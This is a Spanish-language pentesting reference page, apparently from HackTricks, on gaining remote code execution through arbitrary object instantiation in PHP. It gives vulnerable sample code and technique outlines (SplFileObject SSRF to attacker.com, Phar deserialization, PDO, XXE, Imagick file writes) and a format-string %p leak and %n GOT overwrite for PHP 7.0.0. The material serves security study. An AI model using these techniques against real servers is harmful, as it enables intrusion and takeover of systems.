# PHP - RCE abusando de la creación de objetos: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Esto es básicamente un resumen de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introducción

La creación de nuevos objetos arbitrarios, como `new $_GET["a"]($_GET["a"])`, puede conducir a Remote Code Execution (RCE), como se detalla en un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Este documento resalta varias estrategias para lograr RCE.

## RCE vía Clases Personalizadas o Autoloading

La sintaxis `new $a($b)` se usa para instanciar un objeto donde **`$a`** representa el nombre de la clase y **`$b`** es el primer argumento pasado al constructor. Estas variables pueden obtenerse de entradas de usuario como GET/POST, donde pueden ser strings o arrays, o de JSON, donde podrían presentarse como otros tipos.

Considere el siguiente fragmento de código:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
En este caso, asignar `$a` a `App` o `App2` y `$b` a un comando del sistema (por ejemplo, `uname -a`) provoca la ejecución de ese comando.

**Funciones de carga automática** pueden ser explotadas si dichas clases no son accesibles directamente. Estas funciones cargan automáticamente clases desde archivos cuando se necesitan y se definen usando `spl_autoload_register` o `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
El comportamiento de la carga automática (autoloading) varía según la versión de PHP, ofreciendo diferentes posibilidades de RCE.

## RCE vía clases integradas

Si faltan clases personalizadas o autocargadores, las **clases integradas de PHP** pueden ser suficientes para RCE. El número de estas clases oscila entre 100 y 200, según la versión de PHP y las extensiones. Pueden listarse usando `get_declared_classes()`.

Los constructores de interés pueden identificarse mediante la API de reflexión, como se muestra en el siguiente ejemplo y en el enlace [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE vía métodos específicos incluye:**

### **SSRF + Phar Deserialization**

La clase `SplFileObject` permite SSRF a través de su constructor, permitiendo conexiones a cualquier URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF puede conducir a deserialization attacks en versiones de PHP anteriores a 8.0 usando el protocolo Phar.

### **Explotando PDOs**

El constructor de la clase PDO permite conexiones a bases de datos a través de cadenas DSN, potencialmente habilitando la creación de archivos u otras interacciones:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Las versiones de PHP hasta 5.3.22 y 5.4.12 eran susceptibles a ataques XXE a través de los constructores `SoapClient` y `SimpleXMLElement`, dependiendo de la versión de libxml2.

## RCE via Imagick Extension

En el análisis de las **dependencias de un proyecto**, se descubrió que **Imagick** podía aprovecharse para **ejecución de comandos** al instanciar nuevos objetos. Esto presenta una oportunidad para explotar vulnerabilidades.

### VID parser

Se identificó la capacidad del VID parser de escribir contenido en cualquier ruta especificada del sistema de archivos. Esto podría llevar a colocar un PHP shell en un directorio accesible desde la web, logrando RCE.

#### VID Parser + File Upload

Cabe señalar que PHP almacena temporalmente los archivos subidos en `/tmp/phpXXXXXX`. El VID parser en Imagick, utilizando el protocolo **msl**, puede manejar comodines en rutas de archivos, facilitando la transferencia del archivo temporal a una ubicación elegida. Este método ofrece un enfoque adicional para lograr escritura arbitraria de archivos en el sistema de archivos.

### PHP Crash + Brute Force

Un método descrito en el [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) consiste en subir archivos que provocan un crash del servidor antes de su eliminación. Mediante brute-forcing del nombre del archivo temporal, se vuelve posible que Imagick ejecute código PHP arbitrario. Sin embargo, se encontró que esta técnica solo era efectiva en una versión obsoleta de ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Cuando la entrada del usuario controla el nombre de la clase (por ejemplo, `new $_GET['model']()`), PHP 7.0.0 introdujo un bug transitorio durante el refactor de `Throwable` donde el motor trataba por error el nombre de la clase como una cadena de formato printf durante la resolución. Esto habilita primitivas clásicas al estilo printf dentro de PHP: leaks con `%p`, control del contador de escritura con especificadores de ancho, y escrituras arbitrarias con `%n` contra punteros en proceso (por ejemplo, entradas GOT en builds ELF).

Patrón mínimo de repro vulnerable:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Esquema de explotación (de la referencia):
- Leak addresses via `%p` in the class name to find a writable target:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Usa parámetros posicionales y especificadores de ancho para establecer un conteo exacto de bytes, luego `%n` para escribir ese valor en una dirección alcanzable en el stack, apuntando a una entrada del GOT (p. ej., `free`) para sobrescribirla parcialmente hacia `system`.
- Provoca la función secuestrada pasando un nombre de clase que contenga un pipe de shell para invocar `system("id")`.

Notas:
- Funciona solo en PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); corregido en versiones posteriores. Severidad: crítica si existe instanciación arbitraria de clases.
- Los payloads típicos encadenan muchos `%p` para recorrer el stack, luego `%.<width>d%<pos>$n` para lograr la sobrescritura parcial.

## Referencias

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
